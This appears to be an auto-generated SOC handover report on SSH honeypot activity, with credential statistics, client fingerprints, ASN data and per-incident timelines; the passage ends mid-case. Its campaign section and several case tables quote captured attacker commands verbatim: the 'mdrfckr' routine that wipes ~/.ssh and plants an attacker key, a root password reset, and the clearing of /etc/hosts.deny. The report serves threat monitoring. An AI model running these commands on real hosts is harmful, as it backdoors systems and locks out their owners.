# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-08 |
| **Generated At** | 2026-11-08T17:26:20Z |
| **Shift Time** | 17:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **272** |
| Confirmed Threats | **212** |
| False Positives Filtered | **60** (22.1%) |
| Unique Attacker IPs | **168** |
| Countries of Origin | **51** |
| High Severity Cases | **135** |
| Medium Severity Cases | **2** |
| Low Severity Cases | **135** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **7793** |
| Unique Credential Pairs | **1268** |
| Unique Usernames | **427** |
| Unique Passwords | **843** |
| Successful Auth Pairs | **7648** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 2632 |
| `ubuntu` | 238 |
| `admin` | 188 |
| `user` | 159 |
| `deploy` | 152 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 463 |
| `123` | 251 |
| `1234` | 182 |
| `12345678` | 122 |
| `1` | 116 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 52 |
| `root` | `root3245gs5662d34111111111` | 42 |
| `support` | `support` | 37 |
| `345gs5662d34` | `345gs5662d34` | 13 |
| `admin` | `admin` | 11 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `asdf1234` | `109.160.32.141` | 2026-11-08T02:55:07 |
| `claude` | `123` | `109.160.32.106` | 2026-11-08T02:55:08 |
| `liuyan` | `liuyan` | `109.160.32.106` | 2026-11-08T02:55:12 |
| `github` | `Passw0rd` | `109.160.32.141` | 2026-11-08T02:55:13 |
| `root` | `aA123456` | `109.160.32.106` | 2026-11-08T02:55:17 |
| `deploy` | `12345` | `109.160.32.141` | 2026-11-08T02:55:18 |
| `appuser` | `123456` | `109.160.32.106` | 2026-11-08T02:55:22 |
| `felix` | `felix` | `109.160.32.141` | 2026-11-08T02:55:23 |
| `root` | `12345` | `109.160.32.106` | 2026-11-08T02:55:26 |
| `guest` | `123456` | `109.160.32.141` | 2026-11-08T02:55:28 |
| `deploy` | `0` | `109.160.32.106` | 2026-11-08T02:55:32 |
| `username` | `123` | `109.160.32.141` | 2026-11-08T02:55:33 |
| `mysql` | `123456` | `109.160.32.106` | 2026-11-08T02:55:36 |
| `zfh` | `!@` | `109.160.32.141` | 2026-11-08T02:55:39 |
| `system` | `system` | `109.160.32.106` | 2026-11-08T02:55:41 |
| `toor` | `admin123!@` | `109.160.32.141` | 2026-11-08T02:55:43 |
| `admin` | `0000` | `109.160.32.106` | 2026-11-08T02:55:46 |
| `us81` | `pass123` | `109.160.32.141` | 2026-11-08T02:55:48 |
| `root` | `123@456` | `109.160.32.106` | 2026-11-08T02:55:50 |
| `fivem` | `fivem` | `109.160.32.141` | 2026-11-08T02:55:53 |
_… 7628 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **272** |
| Sessions with Fingerprint | **28** |
| Unique HASSH Fingerprints | **28** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 66 |
| libssh | 63 |
| OpenSSH | 14 |
| Unknown | 4 |
| Nmap scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 55 | 29 |
| `0a07365cc01f...` | Generic scanner | 20 | 8 |
| `2ec37a7cc8da...` | Mirai/variant | 19 | 2 |
| `084386fa7ae5...` | Mirai/variant | 8 | 8 |
| `eff4c24daffc...` | Modern SSH client | 7 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 55 | 29 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 20 | 8 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 19 | 2 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 8 | 8 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `95420f9d932d...` | OpenSSH | 6 | 6 | — |
| `dd9bcf093c35...` | Unknown | 3 | 3 | Mirai/variant |
| `52c99fce46b6...` | Go SSH scanner | 3 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **31** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 46 | 28 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:uGH0PYBY8pEK"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `103.42.74.124`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `181.188.148.74`, `190.239.55.74`, `45.172.153.100`, `190.129.122.12`, `190.181.44.194`, `103.200.22.154`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **168** |
| Unique ASNs | **92** |
| High-Risk ASNs | **70** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 38 | HIGH |
| `AS25369` | Hydra Communications Ltd | 5 | LOW |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS198364` | BANATSYNC SRL | 5 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 3 | HIGH |
| `AS50219` | Valence Technology Co. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (128)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-39429997b45c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]106` |
| **First Seen** | 2026-11-08 02:55 |
| **Last Seen** | 2026-11-08 02:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 02:55:06` | `cowrie.session.connect` |
| `2026-11-08 02:55:07` | `cowrie.client.version` |
| `2026-11-08 02:55:07` | `cowrie.client.kex` |
| `2026-11-08 02:55:08` | `cowrie.login.success` |
| `2026-11-08 02:55:09` | `cowrie.session.params` |
| `2026-11-08 02:55:09` | `cowrie.command.input` |
| `2026-11-08 02:55:09` | `cowrie.log.closed` |
| `2026-11-08 02:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]106` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf7b8fc89530

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]141` |
| **First Seen** | 2026-11-08 02:55 |
| **Last Seen** | 2026-11-08 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 02:55:07` | `cowrie.session.connect` |
| `2026-11-08 02:55:07` | `cowrie.client.version` |
| `2026-11-08 02:55:07` | `cowrie.client.kex` |
| `2026-11-08 02:55:07` | `cowrie.login.success` |
| `2026-11-08 02:55:08` | `cowrie.session.params` |
| `2026-11-08 02:55:08` | `cowrie.command.input` |
| `2026-11-08 02:55:08` | `cowrie.log.closed` |
| `2026-11-08 02:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]141` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50c07a61ae9d

| Field | Detail |
|---|---|
| **Source IP** | `180.76.202[.]69` |
| **First Seen** | 2026-11-08 02:57 |
| **Last Seen** | 2026-11-08 03:02 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 02:57:22` | `cowrie.session.connect` |
| `2026-11-08 02:57:22` | `cowrie.client.version` |
| `2026-11-08 02:57:22` | `cowrie.client.kex` |
| `2026-11-08 02:57:24` | `cowrie.login.success` |
| `2026-11-08 02:57:25` | `cowrie.session.params` |
| `2026-11-08 02:57:25` | `cowrie.command.input` |
| `2026-11-08 02:57:25` | `cowrie.command.failed` |
| `2026-11-08 02:57:25` | `cowrie.log.closed` |
| `2026-11-08 02:57:26` | `cowrie.session.params` |
| `2026-11-08 02:57:26` | `cowrie.command.input` |
| `2026-11-08 03:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.202[.]69` to AbuseIPDB if not already reported
- [ ] Block `180.76.202[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-678872eb8952

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-08 02:57 |
| **Last Seen** | 2026-11-08 02:59 |
| **Session Duration** | 145s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_db6cc2c54c4b20df9c600bd8850785d4_small_control'"'"' '"'"'check_db6cc2c54c4b20df9c600bd8850785d4'"'"'', printf '\n%s|%s\n' 'check_db6cc2c54c4b20df9c600bd8850785d4_small_control' 'check_db6cc2c54c4b20df9c600bd8850785d4', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_db6cc2c54c4b20df9c600bd8850785d4_small_math'"'"' "$((341*312+10))"', (341*312+10, printf '\n%s|%s\n' 'check_db6cc2c54c4b20df9c600bd8850785d4_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 02:57:29` | `cowrie.session.connect` |
| `2026-11-08 02:57:29` | `cowrie.client.version` |
| `2026-11-08 02:57:29` | `cowrie.client.kex` |
| `2026-11-08 02:57:31` | `cowrie.login.success` |
| `2026-11-08 02:57:34` | `cowrie.client.size` |
| `2026-11-08 02:57:35` | `cowrie.session.params` |
| `2026-11-08 02:57:36` | `cowrie.command.input` |
| `2026-11-08 02:57:36` | `cowrie.command.input` |
| `2026-11-08 02:57:36` | `cowrie.command.input` |
| `2026-11-08 02:57:36` | `cowrie.command.input` |
| `2026-11-08 02:57:36` | `cowrie.command.input` |
| `2026-11-08 02:57:36` | `cowrie.command.input` |
| `2026-11-08 02:57:36` | `cowrie.command.input` |
| `2026-11-08 02:57:36` | `cowrie.command.input` |
| `2026-11-08 02:57:36` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36413fdb0e4c

| Field | Detail |
|---|---|
| **Source IP** | `180.76.202[.]69` |
| **First Seen** | 2026-11-08 02:57 |
| **Last Seen** | 2026-11-08 02:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 02:57:54` | `cowrie.session.connect` |
| `2026-11-08 02:57:54` | `cowrie.client.version` |
| `2026-11-08 02:57:54` | `cowrie.client.kex` |
| `2026-11-08 02:57:56` | `cowrie.login.success` |
| `2026-11-08 02:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.202[.]69` to AbuseIPDB if not already reported
- [ ] Block `180.76.202[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d3691989a40

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]153` |
| **First Seen** | 2026-11-08 02:59 |
| **Last Seen** | 2026-11-08 02:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 02:59:26` | `cowrie.session.connect` |
| `2026-11-08 02:59:26` | `cowrie.client.version` |
| `2026-11-08 02:59:26` | `cowrie.client.kex` |
| `2026-11-08 02:59:27` | `cowrie.login.success` |
| `2026-11-08 02:59:28` | `cowrie.session.params` |
| `2026-11-08 02:59:28` | `cowrie.command.input` |
| `2026-11-08 02:59:28` | `cowrie.log.closed` |
| `2026-11-08 02:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]153` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61a7926355c6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-08 03:01 |
| **Last Seen** | 2026-11-08 03:01 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 03:01:28` | `cowrie.session.connect` |
| `2026-11-08 03:01:29` | `cowrie.client.version` |
| `2026-11-08 03:01:29` | `cowrie.client.kex` |
| `2026-11-08 03:01:37` | `cowrie.login.success` |
| `2026-11-08 03:01:43` | `cowrie.client.size` |
| `2026-11-08 03:01:46` | `cowrie.session.params` |
| `2026-11-08 03:01:54` | `cowrie.log.closed` |
| `2026-11-08 03:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-074bae110d3f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-08 03:05 |
| **Last Seen** | 2026-11-08 03:10 |
| **Session Duration** | 327s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2691d79a33722a1e68008f5c03929002_small_control'"'"' '"'"'check_2691d79a33722a1e68008f5c03929002'"'"'', printf '\n%s|%s\n' 'check_2691d79a33722a1e68008f5c03929002_small_control' 'check_2691d79a33722a1e68008f5c03929002', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2691d79a33722a1e68008f5c03929002_small_math'"'"' "$((901*690+77))"', (901*690+77, printf '\n%s|%s\n' 'check_2691d79a33722a1e68008f5c03929002_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 03:05:05` | `cowrie.session.connect` |
| `2026-11-08 03:05:06` | `cowrie.client.version` |
| `2026-11-08 03:05:06` | `cowrie.client.kex` |
| `2026-11-08 03:05:33` | `cowrie.login.success` |
| `2026-11-08 03:05:38` | `cowrie.client.size` |
| `2026-11-08 03:05:40` | `cowrie.session.params` |
| `2026-11-08 03:05:42` | `cowrie.command.input` |
| `2026-11-08 03:05:42` | `cowrie.command.input` |
| `2026-11-08 03:05:42` | `cowrie.command.input` |
| `2026-11-08 03:05:42` | `cowrie.command.input` |
| `2026-11-08 03:05:42` | `cowrie.command.input` |
| `2026-11-08 03:05:42` | `cowrie.command.input` |
| `2026-11-08 03:05:42` | `cowrie.command.input` |
| `2026-11-08 03:05:42` | `cowrie.command.input` |
| `2026-11-08 03:05:42` | `cowrie.command.input` |
| … | _48 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd7f8d316e71

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-08 03:10 |
| **Last Seen** | 2026-11-08 03:14 |
| **Session Duration** | 250s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_89522b4bc86a67caa511ae52c91835cc_small_control'"'"' '"'"'check_89522b4bc86a67caa511ae52c91835cc'"'"'', printf '\n%s|%s\n' 'check_89522b4bc86a67caa511ae52c91835cc_small_control' 'check_89522b4bc86a67caa511ae52c91835cc', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_89522b4bc86a67caa511ae52c91835cc_small_math'"'"' "$((260*183+41))"', (260*183+41, printf '\n%s|%s\n' 'check_89522b4bc86a67caa511ae52c91835cc_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 03:10:35` | `cowrie.session.connect` |
| `2026-11-08 03:10:35` | `cowrie.client.version` |
| `2026-11-08 03:10:35` | `cowrie.client.kex` |
| `2026-11-08 03:10:41` | `cowrie.login.success` |
| `2026-11-08 03:10:45` | `cowrie.client.size` |
| `2026-11-08 03:10:47` | `cowrie.session.params` |
| `2026-11-08 03:10:49` | `cowrie.command.input` |
| `2026-11-08 03:10:49` | `cowrie.command.input` |
| `2026-11-08 03:10:49` | `cowrie.command.input` |
| `2026-11-08 03:10:49` | `cowrie.command.input` |
| `2026-11-08 03:10:49` | `cowrie.command.input` |
| `2026-11-08 03:10:49` | `cowrie.command.input` |
| `2026-11-08 03:10:49` | `cowrie.command.input` |
| `2026-11-08 03:10:49` | `cowrie.command.input` |
| `2026-11-08 03:10:49` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9259c7c0ebea

| Field | Detail |
|---|---|
| **Source IP** | `35.210.62[.]153` |
| **First Seen** | 2026-11-08 03:12 |
| **Last Seen** | 2026-11-08 03:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 03:12:43` | `cowrie.session.connect` |
| `2026-11-08 03:12:43` | `cowrie.client.version` |
| `2026-11-08 03:12:43` | `cowrie.client.kex` |
| `2026-11-08 03:12:45` | `cowrie.login.success` |
| `2026-11-08 03:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.62[.]153` to AbuseIPDB if not already reported
- [ ] Block `35.210.62[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f1754311f7a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-08 03:14 |
| **Last Seen** | 2026-11-08 03:18 |
| **Session Duration** | 195s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_47ae1861b2046d4eb788011551f53025_small_control'"'"' '"'"'check_47ae1861b2046d4eb788011551f53025'"'"'', printf '\n%s|%s\n' 'check_47ae1861b2046d4eb788011551f53025_small_control' 'check_47ae1861b2046d4eb788011551f53025', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_47ae1861b2046d4eb788011551f53025_small_math'"'"' "$((405*296+18))"', (405*296+18, printf '\n%s|%s\n' 'check_47ae1861b2046d4eb788011551f53025_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 03:14:45` | `cowrie.session.connect` |
| `2026-11-08 03:14:47` | `cowrie.client.version` |
| `2026-11-08 03:14:47` | `cowrie.client.kex` |
| `2026-11-08 03:15:00` | `cowrie.login.success` |
| `2026-11-08 03:15:06` | `cowrie.client.size` |
| `2026-11-08 03:15:07` | `cowrie.session.params` |
| `2026-11-08 03:15:09` | `cowrie.command.input` |
| `2026-11-08 03:15:09` | `cowrie.command.input` |
| `2026-11-08 03:15:09` | `cowrie.command.input` |
| `2026-11-08 03:15:09` | `cowrie.command.input` |
| `2026-11-08 03:15:09` | `cowrie.command.input` |
| `2026-11-08 03:15:09` | `cowrie.command.input` |
| `2026-11-08 03:15:09` | `cowrie.command.input` |
| `2026-11-08 03:15:09` | `cowrie.command.input` |
| `2026-11-08 03:15:09` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73b6a340a5fd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-08 03:18 |
| **Last Seen** | 2026-11-08 03:18 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_96d8254bdc63ed84c1c9f1dcfa8ce5a1_small_control'"'"' '"'"'check_96d8254bdc63ed84c1c9f1dcfa8ce5a1'"'"'', printf '\n%s|%s\n' 'check_96d8254bdc63ed84c1c9f1dcfa8ce5a1_small_control' 'check_96d8254bdc63ed84c1c9f1dcfa8ce5a1', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_96d8254bdc63ed84c1c9f1dcfa8ce5a1_small_math'"'"' "$((731*629+11))"', (731*629+11, printf '\n%s|%s\n' 'check_96d8254bdc63ed84c1c9f1dcfa8ce5a1_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 03:18:01` | `cowrie.session.connect` |
| `2026-11-08 03:18:05` | `cowrie.client.version` |
| `2026-11-08 03:18:05` | `cowrie.client.kex` |
| `2026-11-08 03:18:16` | `cowrie.login.success` |
| `2026-11-08 03:18:25` | `cowrie.client.size` |
| `2026-11-08 03:18:27` | `cowrie.session.params` |
| `2026-11-08 03:18:29` | `cowrie.command.input` |
| `2026-11-08 03:18:29` | `cowrie.command.input` |
| `2026-11-08 03:18:29` | `cowrie.command.input` |
| `2026-11-08 03:18:29` | `cowrie.command.input` |
| `2026-11-08 03:18:29` | `cowrie.command.input` |
| `2026-11-08 03:18:29` | `cowrie.command.input` |
| `2026-11-08 03:18:29` | `cowrie.command.input` |
| `2026-11-08 03:18:29` | `cowrie.command.input` |
| `2026-11-08 03:18:29` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50481b6019ae

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-08 03:18 |
| **Last Seen** | 2026-11-08 03:19 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8bbdcf67af07eff063a74d0e28b30d4b_small_control'"'"' '"'"'check_8bbdcf67af07eff063a74d0e28b30d4b'"'"'', printf '\n%s|%s\n' 'check_8bbdcf67af07eff063a74d0e28b30d4b_small_control' 'check_8bbdcf67af07eff063a74d0e28b30d4b', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8bbdcf67af07eff063a74d0e28b30d4b_small_math'"'"' "$((879*573+78))"', (879*573+78, printf '\n%s|%s\n' 'check_8bbdcf67af07eff063a74d0e28b30d4b_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 03:18:34` | `cowrie.session.connect` |
| `2026-11-08 03:18:36` | `cowrie.client.version` |
| `2026-11-08 03:18:36` | `cowrie.client.kex` |
| `2026-11-08 03:18:50` | `cowrie.login.success` |
| `2026-11-08 03:18:54` | `cowrie.client.size` |
| `2026-11-08 03:19:03` | `cowrie.session.params` |
| `2026-11-08 03:19:04` | `cowrie.command.input` |
| `2026-11-08 03:19:04` | `cowrie.command.input` |
| `2026-11-08 03:19:04` | `cowrie.command.input` |
| `2026-11-08 03:19:04` | `cowrie.command.input` |
| `2026-11-08 03:19:04` | `cowrie.command.input` |
